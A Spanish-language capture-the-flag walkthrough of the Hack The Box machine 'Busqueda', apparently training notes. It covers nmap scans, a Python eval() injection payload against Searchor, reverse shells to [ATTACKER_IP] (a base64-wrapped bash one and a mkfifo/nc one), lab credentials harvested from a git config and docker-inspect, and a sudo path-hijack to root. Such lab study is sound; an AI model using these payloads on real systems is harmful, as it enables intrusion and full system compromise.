---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - HTTP
  - CodeInjection
  - SSH
  - Sudo
  - PathHijacking
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Enumeración del sistema|Enumeración del sistema]]
	- [[#Enumeración#Enumeración de puertos|Enumeración de puertos]]
	- [[#Enumeración#HTTP|HTTP]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Code Injection|Code Injection]]
	- [[#Explotación#Lateral Movement|Lateral Movement]]
		- [[#Lateral Movement#SSH|SSH]]
- [[#Escalada de Privilegios|Escalada de Privilegios]]
	- [[#Escalada de Privilegios#Sudo -l|Sudo -l]]
	- [[#Escalada de Privilegios#Acceso a Gitea|Acceso a Gitea]]
		- [[#Acceso a Gitea#Autenticación como cody|Autenticación como cody]]
		- [[#Acceso a Gitea#Autenticación como Administrator|Autenticación como Administrator]]
	- [[#Escalada de Privilegios#Path Hijacking|Path Hijacking]]

---
# Busqueda

![](Screenshots/Pasted%20image%2020260428140239.png)

>Máquina de Hack The Box llamada **[Busqueda](https://app.hackthebox.com/machines/Busqueda)**, orientada a la explotación de una aplicación web vulnerable y escalada de privilegios en un entorno Linux.  
>La intrusión comienza con la enumeración de un servicio web que utiliza el framework `Searchor`, vulnerable a **RCE** debido al uso inseguro de `eval()`. Esto permite obtener una **shell** inicial en el sistema como el usuario `svc`.
>Durante la fase de post-explotación, se identifica un repositorio `.git` accesible que revela **credenciales** reutilizadas, facilitando el acceso a servicios internos. Posteriormente, mediante la ejecución de un script con privilegios elevados (**sudo**), se abusa de funcionalidades relacionadas con Docker para obtener **credenciales** sensibles expuestas en variables de entorno.
>Estas credenciales permiten acceder a una instancia de Gitea con **privilegios** administrativos, donde se analiza código interno del sistema. A partir de este análisis, se identifica una vulnerabilidad de **path hijacking** en un script ejecutado como root.
>Finalmente, explotando esta debilidad mediante la creación de un binario malicioso en una ruta controlada, se consigue **root**, comprometiendo completamente la máquina.

---
## Enumeración
### Enumeración del sistema

```PowerShell
ping -c 1 10.129.228.217
PING 10.129.228.217 (10.129.228.217) 56(84) bytes of data.
64 bytes from 10.129.228.217: icmp_seq=1 ttl=63 time=45.9 ms

--- 10.129.228.217 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 45.928/45.928/45.928/0.000 ms
```

El TTL de `63` (típico en redes Linux con decremento de 1 salto) sugiere que el sistema objetivo es Linux.
### Enumeración de puertos

```PowerShell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.228.217 -oG allPorts
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

```PowerShell
nmap -p22,80 -sCV 10.129.228.217 -oN targeted
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Puertos descubiertos:
- `22 → SSH`  
- `80 → HTTP`

Se añade al archivo `/etc/hosts` el dominio: `10.129.228.217 searcher.htb`.
### HTTP

```HTTP
http://searcher.htb/
```

![](Screenshots/Pasted%20image%2020260428140314.png)

Se identifica que `Searchor 2.4.0` utiliza `eval()` de forma insegura al procesar input del usuario, lo que permite ejecución de código arbitrario., se adjunta [commit](https://github.com/ArjunSharda/Searchor/pull/130/files).

![](Screenshots/Pasted%20image%2020260429112948.png)

---
## Explotación
### Code Injection

La aplicación usa `eval()` sobre input del usuario, permitiendo ejecutar código Python arbitrario (RCE).

Payload utilizado:

```Python
')+ str(__import__('os').system('id')) #
uid=1000(svc) gid=1000(svc) groups=1000(svc) https://www.accuweather.com/en/search-locations?query=0
```

El vector de ataque se basa en la inyección dentro de un `eval()` en Python, donde el input del usuario se concatena directamente en una expresión evaluada.

Se codifica en **Base64** para simplificar el transporte del payload en el parámetro **HTTP**.

Máquina atacante:

```PowerShell
echo "sh -i >& /dev/tcp/[ATTACKER_IP]/1234 0>&1" | base64
nc -nlvp 1234
```

Máquina victima:

```PowerShell
')+ str(__import__('os').system('echo [BASE64_ENCODED]|base64 -d |bash')) #
```

Se obtiene una consola interactiva con el usuario `svc`.

La flag de `usuario` se encuentra en: `/home/svc`.
### Lateral Movement

Se encuentra un archivo llamado `config` en el directorio: `/var/www/app/.git`.

```PowerShell
cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

Se encuentra las credenciales: `cody:jh1usoih2bkjaspwe92`, además del dominio `gitea.searcher.htb`.

Al tener un servicio `SSH` se prueba el acceso `SSH` reutilizando las credenciales filtradas previamente.
#### SSH

```PowerShell
ssh svc@10.129.228.217
svc@busqueda:~$
```

---
## Escalada de Privilegios
### Sudo -l

Una vez obtenida una shell como el usuario `svc`, se enumeran los privilegios disponibles:

```PowerShell
sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

```PowerShell
ls -l /opt/scripts/system-checkup.py
-rwx--x--x 1 root root 1903 Dec 24  2022 /opt/scripts/system-checkup.py
```

Se analiza el script ejecutable con privilegios elevados para identificar posibles vectores de abuso.

```PowerShell
sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Dado que el script permite interactuar con Docker, se explora la opción  [docker-inspect](https://docs.docker.com/engine/reference/commandline/inspect/) en busca de información sensible como variables de entorno o credenciales.

```Json
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea
{
  "Id": "960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb",
  "Created": "2023-01-06T17:26:54.457090149Z",
  "Path": "/usr/bin/entrypoint",
  "Args": [
    "/bin/s6-svscan",
    "/etc/s6"
  ],
  "State": {
    "Status": "running",
    "Running": true,
    "Paused": false,
    "Restarting": false,
    "OOMKilled": false,
    "Dead": false,
    "Pid": 1723,
    "ExitCode": 0,
    "Error": "",
    "StartedAt": "2026-04-29T08:40:32.115471575Z",
    "FinishedAt": "2023-04-04T17:03:01.71746837Z"
  },
  "Image": "sha256:6cd4959e1db11e85d89108b74db07e2a96bbb5c4eb3aa97580e65a8153ebcc78",
  "ResolvConfPath": "/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/resolv.conf",
  "HostnamePath": "/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/hostname",
  "HostsPath": "/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/hosts",
  "LogPath": "/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb-json.log",
  "Name": "/gitea",
  "RestartCount": 0,
  "Driver": "overlay2",
  "Platform": "linux",
  "MountLabel": "",
  "ProcessLabel": "",
  "AppArmorProfile": "docker-default",
  "ExecIDs": null,
  "HostConfig": {
    "Binds": [
      "/etc/timezone:/etc/timezone:ro",
      "/etc/localtime:/etc/localtime:ro",
      "/root/scripts/docker/gitea:/data:rw"
    ],
    "ContainerIDFile": "",
    "LogConfig": {
      "Type": "json-file",
      "Config": {}
    },
    "NetworkMode": "docker_gitea",
    "PortBindings": {
      "22/tcp": [
        {
          "HostIp": "127.0.0.1",
          "HostPort": "222"
        }
      ],
      "3000/tcp": [
        {
          "HostIp": "127.0.0.1",
          "HostPort": "3000"
        }
      ]
    },
    "RestartPolicy": {
      "Name": "always",
      "MaximumRetryCount": 0
    },
    "AutoRemove": false,
    "VolumeDriver": "",
    "VolumesFrom": [],
    "CapAdd": null,
    "CapDrop": null,
    "CgroupnsMode": "private",
    "Dns": [],
    "DnsOptions": [],
    "DnsSearch": [],
    "ExtraHosts": null,
    "GroupAdd": null,
    "IpcMode": "private",
    "Cgroup": "",
    "Links": null,
    "OomScoreAdj": 0,
    "PidMode": "",
    "Privileged": false,
    "PublishAllPorts": false,
    "ReadonlyRootfs": false,
    "SecurityOpt": null,
    "UTSMode": "",
    "UsernsMode": "",
    "ShmSize": 67108864,
    "Runtime": "runc",
    "ConsoleSize": [
      0,
      0
    ],
    "Isolation": "",
    "CpuShares": 0,
    "Memory": 0,
    "NanoCpus": 0,
    "CgroupParent": "",
    "BlkioWeight": 0,
    "BlkioWeightDevice": null,
    "BlkioDeviceReadBps": null,
    "BlkioDeviceWriteBps": null,
    "BlkioDeviceReadIOps": null,
    "BlkioDeviceWriteIOps": null,
    "CpuPeriod": 0,
    "CpuQuota": 0,
    "CpuRealtimePeriod": 0,
    "CpuRealtimeRuntime": 0,
    "CpusetCpus": "",
    "CpusetMems": "",
    "Devices": null,
    "DeviceCgroupRules": null,
    "DeviceRequests": null,
    "KernelMemory": 0,
    "KernelMemoryTCP": 0,
    "MemoryReservation": 0,
    "MemorySwap": 0,
    "MemorySwappiness": null,
    "OomKillDisable": null,
    "PidsLimit": null,
    "Ulimits": null,
    "CpuCount": 0,
    "CpuPercent": 0,
    "IOMaximumIOps": 0,
    "IOMaximumBandwidth": 0,
    "MaskedPaths": [
      "/proc/asound",
      "/proc/acpi",
      "/proc/kcore",
      "/proc/keys",
      "/proc/latency_stats",
      "/proc/timer_list",
      "/proc/timer_stats",
      "/proc/sched_debug",
      "/proc/scsi",
      "/sys/firmware"
    ],
    "ReadonlyPaths": [
      "/proc/bus",
      "/proc/fs",
      "/proc/irq",
      "/proc/sys",
      "/proc/sysrq-trigger"
    ]
  },
  "GraphDriver": {
    "Data": {
      "LowerDir": "/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34-init/diff:/var/lib/docker/overlay2/bd9193f562680204dc7c46c300e3410c51a1617811a43c97dffc9c3ee6b6b1b8/diff:/var/lib/docker/overlay2/df299917c1b8b211d36ab079a37a210326c9118be26566b07944ceb4342d3716/diff:/var/lib/docker/overlay2/50fb3b75789bf3c16c94f888a75df2691166dd9f503abeadabbc3aa808b84371/diff:/var/lib/docker/overlay2/3668660dd8ccd90774d7f567d0b63cef20cccebe11aaa21253da056a944aab22/diff:/var/lib/docker/overlay2/a5ca101c0f3a1900d4978769b9d791980a73175498cbdd47417ac4305dabb974/diff:/var/lib/docker/overlay2/aac5470669f77f5af7ad93c63b098785f70628cf8b47ac74db039aa3900a1905/diff:/var/lib/docker/overlay2/ef2d799b8fba566ee84a45a0070a1cf197cd9b6be58f38ee2bd7394bb7ca6560/diff:/var/lib/docker/overlay2/d45da5f3ac6633ab90762d7eeac53b0b83debef94e467aebed6171acca3dbc39/diff",                                                                
      "MergedDir": "/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/merged",
      "UpperDir": "/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/diff",
      "WorkDir": "/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/work"
    },
    "Name": "overlay2"
  },
  "Mounts": [
    {
      "Type": "bind",
      "Source": "/etc/localtime",
      "Destination": "/etc/localtime",
      "Mode": "ro",
      "RW": false,
      "Propagation": "rprivate"
    },
    {
      "Type": "bind",
      "Source": "/etc/timezone",
      "Destination": "/etc/timezone",
      "Mode": "ro",
      "RW": false,
      "Propagation": "rprivate"
    },
    {
      "Type": "bind",
      "Source": "/root/scripts/docker/gitea",
      "Destination": "/data",
      "Mode": "rw",
      "RW": true,
      "Propagation": "rprivate"
    }
  ],
  "Config": {
    "Hostname": "960873171e2e",
    "Domainname": "",
    "User": "",
    "AttachStdin": false,
    "AttachStdout": false,
    "AttachStderr": false,
    "ExposedPorts": {
      "22/tcp": {},
      "3000/tcp": {}
    },
    "Tty": false,
    "OpenStdin": false,
    "StdinOnce": false,
    "Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"
    ],
    "Cmd": [
      "/bin/s6-svscan",
      "/etc/s6"
    ],
    "Image": "gitea/gitea:latest",
    "Volumes": {
      "/data": {},
      "/etc/localtime": {},
      "/etc/timezone": {}
    },
    "WorkingDir": "",
    "Entrypoint": [
      "/usr/bin/entrypoint"
    ],
    "OnBuild": null,
    "Labels": {
      "com.docker.compose.config-hash": "e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515",
      "com.docker.compose.container-number": "1",
      "com.docker.compose.oneoff": "False",
      "com.docker.compose.project": "docker",
      "com.docker.compose.project.config_files": "docker-compose.yml",
      "com.docker.compose.project.working_dir": "/root/scripts/docker",
      "com.docker.compose.service": "server",
      "com.docker.compose.version": "1.29.2",
      "maintainer": "maintainers@gitea.io",
      "org.opencontainers.image.created": "2022-11-24T13:22:00Z",
      "org.opencontainers.image.revision": "9bccc60cf51f3b4070f5506b042a3d9a1442c73d",
      "org.opencontainers.image.source": "https://github.com/go-gitea/gitea.git",
      "org.opencontainers.image.url": "https://github.com/go-gitea/gitea"
    }
  },
  "NetworkSettings": {
    "Bridge": "",
    "SandboxID": "d70704191c497fabe0b23deabfb56816c87eb6d04a0277d30ebadd1cf758dae3",
    "HairpinMode": false,
    "LinkLocalIPv6Address": "",
    "LinkLocalIPv6PrefixLen": 0,
    "Ports": {
      "22/tcp": [
        {
          "HostIp": "127.0.0.1",
          "HostPort": "222"
        }
      ],
      "3000/tcp": [
        {
          "HostIp": "127.0.0.1",
          "HostPort": "3000"
        }
      ]
    },
    "SandboxKey": "/var/run/docker/netns/d70704191c49",
    "SecondaryIPAddresses": null,
    "SecondaryIPv6Addresses": null,
    "EndpointID": "",
    "Gateway": "",
    "GlobalIPv6Address": "",
    "GlobalIPv6PrefixLen": 0,
    "IPAddress": "",
    "IPPrefixLen": 0,
    "IPv6Gateway": "",
    "MacAddress": "",
    "Networks": {
      "docker_gitea": {
        "IPAMConfig": null,
        "Links": null,
        "Aliases": [
          "server",
          "960873171e2e"
        ],
        "NetworkID": "cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227",
        "EndpointID": "80b6bcfdaedfc2e947c409d287c8cdd228b3098d0b7768f2165a580299d7fbff",
        "Gateway": "172.19.0.1",
        "IPAddress": "172.19.0.2",
        "IPPrefixLen": 16,
        "IPv6Gateway": "",
        "GlobalIPv6Address": "",
        "GlobalIPv6PrefixLen": 0,
        "MacAddress": "02:42:ac:13:00:02",
        "DriverOpts": null
      }
    }
  }
}
```

Se obtiene las credenciales: `gitea:yuiu1hoiu4i5ho1uh`. Estas credenciales corresponden al servicio Gitea y pueden reutilizarse para acceder a la interfaz web.
### Acceso a Gitea

Se añade al archivo `/etc/hosts` el dominio: `10.129.228.217 gitea.searcher.htb`.
#### Autenticación como cody

```HTTP
http://gitea.searcher.htb
```

![](Screenshots/Pasted%20image%2020260429125922.png)

Se explora la interfaz de `Gitea`.

![](Screenshots/Pasted%20image%2020260429125959.png)

Se encuentran los usuarios: `Administrator` y `cody`.

Se prueba a iniciar sesión con las credenciales obtenidas anteriormente.

Se inicia sesión correctamente en Gitea con el usuario `cody`.

![](Screenshots/Pasted%20image%2020260429130630.png)

**Observaciones:**
- Se confirma reutilización de credenciales dentro del sistema.
- El usuario `cody` tiene acceso a repositorios privados.
- Esto es especialmente relevante, ya que permite auditar código interno de la aplicación y lógica de administración del sistema.
#### Autenticación como Administrator

Se prueba las credenciales en `Gitea` para el usuario `Administrator`.

Se encuentra un repositorio privado llamado `scripts`, que se procede a analizar.

El acceso a `Gitea` permite auditar código interno del sistema, lo que resulta clave para identificar vulnerabilidades no visibles desde fuera.


![](Screenshots/Pasted%20image%2020260429131903.png)

En el archivo `system-checkup.py`, se encuentra una ruta relativa para `./full-checkup`, cuando debería ser absoluta.

![](Screenshots/Pasted%20image%2020260429132022.png)

Se accede al directorio del script y se ejecuta.

```PowerShell
cd /opt/scripts
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
[=] Docker conteainers
{
  "/gitea": "running"
}
{
  "/mysql_db": "running"
}

[=] Docker port mappings
{
  "22/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "222"
    }
  ],
  "3000/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "3000"
    }
  ]
}

[=] Apache webhosts
[+] searcher.htb is up
[+] gitea.searcher.htb is up

[=] PM2 processes
┌─────┬────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id  │ name   │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
├─────┼────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
│ 0   │ app    │ default     │ N/A     │ fork    │ 1539     │ 2h     │ 0    │ online    │ 0%       │ 30.0mb   │ svc      │ disabled │
└─────┴────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘

[+] Done!
```
### Path Hijacking

El script invoca `./full-checkup`, lo que permite que el sistema busque el binario en el directorio actual antes que en rutas absolutas del sistema, abriendo la puerta a hijacking del PATH o ejecución de binarios controlados.

Dado que el script se ejecuta con privilegios de root, esto deriva en ejecución arbitraria como root.

Se aprovecha el directorio /tmp para colocar el binario malicioso debido a su carácter escribible y su uso habitual en ejecuciones temporales. Se crea un archivo llamado igual `full-checkup.sh`, pero que ejecute una *reverse shell*.

Además de añadirle permisos de ejecución.

Máquina atacante:

```PowerShell
nc -nlvp 9001
```

Máquina victima:

```PowerShell
echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER_IP] 9001 >/tmp/f" > /tmp/full-checkup.sh
chmod +x /tmp/full-checkup.sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

Se recibe una consola interactiva con `root`.

La flag de `root` se encuentra en: `/root`.

---



